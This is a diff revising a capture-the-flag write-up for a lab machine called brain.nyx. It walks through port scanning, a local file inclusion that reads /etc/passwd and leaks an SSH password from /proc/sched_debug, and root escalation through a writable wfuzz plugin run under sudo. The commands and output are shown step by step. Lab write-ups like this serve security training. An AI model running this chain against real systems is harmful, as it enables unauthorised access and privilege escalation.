@@ -19,7 +19,7 @@ The main page hints at a Local File Inclusion vulnerability by rendering content
 A full TCP port scan is run first:
 
 ```bash
-sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn brain.nyx
+$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn brain.nyx
 
 PORT   STATE SERVICE REASON
 22/tcp open  ssh     syn-ack ttl 64
@@ -30,7 +30,7 @@ MAC Address: 08:00:27:D0:8F:8E (Oracle VirtualBox virtual NIC)
 Two ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:
 
 ```bash
-sudo nmap -p 22,80 -sCV brain.nyx
+$ sudo nmap -p 22,80 -sCV brain.nyx
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
@@ -57,12 +57,12 @@ http://brain.nyx
 
 The content rendered on the front page looks suspiciously like the output of `/proc/sched_debug` — the kernel's task scheduler dump. That's an odd thing to display on a landing page, and it's the first hint that the app is including a local file into the page rather than serving static content:
 
-<img src="../Images\brain\Pasted image 20260517181111.png" alt="Página principal de brain.nyx, mostrando contenido que se asemeja a la salida de /proc/sched_debug"/>
+<img src="../Images\brain\Pasted image 20260517181111.png" alt="brain.nyx main page, showing content resembling /proc/sched_debug output"/>
 
 A directory scan is run to look for pages not linked from the front page:
 
 ```bash
-gobuster dir -u 'http://brain.nyx/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
+$ gobuster dir -u 'http://brain.nyx/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
 
 ===============================================================
 Starting gobuster in directory enumeration mode
@@ -80,7 +80,7 @@ Finished
 `index.php` looks like it's pulling in content dynamically, which raises the question of whether one of its parameters can be pointed at an arbitrary file. `ffuf` is used to fuzz for a parameter name that changes the response when set to a known file path:
 
 ```bash
-ffuf -u 'http://brain.nyx/index.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/dirb/common.txt -fs 361
+$ ffuf -u 'http://brain.nyx/index.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/dirb/common.txt -fs 361
 
 include               [Status: 200, Size: 1750, Words: 125, Lines: 34, Duration: 18ms]
 :: Progress: [4614/4614] :: Job [1/1] :: 292 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
@@ -95,18 +95,18 @@ view-source:http://brain.nyx/?include=/etc/passwd
 The response includes the contents of `/etc/passwd`, confirming arbitrary local file read, and enumerating valid shell users on the box:
 
 ```bash
-curl -sX GET "http://brain.nyx/index.php?include=/etc/passwd" | grep "sh$"
+$ curl -sX GET "http://brain.nyx/index.php?include=/etc/passwd" | grep "sh$"
 
 root:x:0:0:root:/root:/bin/bash
 ben:x:1000:1000:ben,,,:/home/ben:/bin/bash
 ```
 
-<img src="../Images\brain\Pasted image 20260517181210.png" alt="Contenido de /etc/passwd renderizado a través del parámetro include vulnerable"/>
+<img src="../Images\brain\Pasted image 20260517181210.png" alt="/etc/passwd contents rendered through the vulnerable include parameter"/>
 
 Two users with a real shell turn up: `root` and `ben`. Following up on the earlier hint from the front page — whose content already resembled a `sched_debug` dump — the `include` parameter is pointed at `/proc/sched_debug` directly, and the output is filtered for the username just enumerated, `ben`:
 
 ```bash
-curl -sX GET "http://brain.nyx/index.php?include=/proc/sched_debug" | grep ben
+$ curl -sX GET "http://brain.nyx/index.php?include=/proc/sched_debug" | grep ben
 S   ben:B3nP4zz    375   1257.728035    25   120         0.000000        0.989759      0.000000 0 0
 ```
 
@@ -119,7 +119,7 @@ The field that leaks here isn't a command line — `/proc/sched_debug` doesn't e
 The credentials are validated against SSH with `hydra`:
 
 ```bash
-hydra -l 'ben' -p 'B3nP4zz' ssh://brain.nyx
+$ hydra -l 'ben' -p 'B3nP4zz' ssh://brain.nyx
 
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
@@ -132,14 +132,14 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-17 17:59:
 They check out, and a connection follows:
 
 ```bash
-ssh ben@brain.nyx
+$ ssh ben@brain.nyx
 ben@brain.nyx's password:
 Linux brain 4.19.0-23-amd64 #1 SMP Debian 4.19.269-1 (2022-12-20) x86_64
 ben@brain:~$ id
-uid=1000(ben) gid=1000(ben) grupos=1000(ben)
+uid=1000(ben) gid=1000(ben) groups=1000(ben)
 ben@brain:~$ ls -l /home/ben
 total 4
--r-------- 1 ben ben 33 abr 19  2023 user.txt
+-r-------- 1 ben ben 33 Apr 19  2023 user.txt
 ben@brain:~$ cat /home/ben/user.txt
 4be68799a5cef6a6e2b36379e8ae2759
 ```
@@ -157,10 +157,10 @@ Matching Defaults entries for ben on Brain:
 
 User ben may run the following commands on Brain:
     (root) NOPASSWD: /usr/bin/wfuzz
-ben@brain:~$ find / -writable 2>/dev/null |grep -vE "proc/sys/tmp/run/dev/home/var"
+ben@brain:~$ find / -writable 2>/dev/null | grep -vE "proc/sys/tmp/run/dev/home/var"
 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py
 ben@brain:~$ ls -l /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py
--rwxrwxrwx 1 root root 1519 abr 19  2023 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py
+-rwxrwxrwx 1 root root 1519 Apr 19  2023 /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py
 ```
 
 `ben` can run `wfuzz` as root via `sudo`, and one of `wfuzz`'s own Python payload plugins, `range.py`, turns out to be writable. Since `wfuzz` imports and executes that plugin's code as part of generating its fuzz payloads, anything appended to the file runs in whatever context `wfuzz` itself is running under — root, in this case, once invoked through `sudo`.
@@ -180,8 +180,8 @@ ben@brain:~$ sudo -u root /usr/bin/wfuzz -c -z range,1-65535 -u http://127.0.0.1
 Once it runs, the SUID bit is in place:
 
 ```bash
-ls -l /bin/bash
-/bin/bash -p
+ben@brain:~$ ls -l /bin/bash
+-rwsr-xr-x 1 root root ... /bin/bash
 ```
 
 A SUID `bash` retains the privileges of its owner (root) when invoked with `-p`, which skips bash's usual privilege-dropping behavior for SUID binaries.
@@ -189,10 +189,10 @@ A SUID `bash` retains the privileges of its owner (root) when invoked with `-p`,
 ```bash
 ben@brain:~$ /bin/bash -p
 bash-5.0# id
-uid=1000(ben) gid=1000(ben) euid=0(root) grupos=1000(ben)
+uid=1000(ben) gid=1000(ben) euid=0(root) groups=1000(ben)
 bash-5.0# ls -l /root
 total 4
--r-------- 1 root root 33 abr 19  2023 root.txt
+-r-------- 1 root root 33 Apr 19  2023 root.txt
 bash-5.0# cat /root/root.txt
 08c391c2d775390f54ee859d7395ac68
 ```
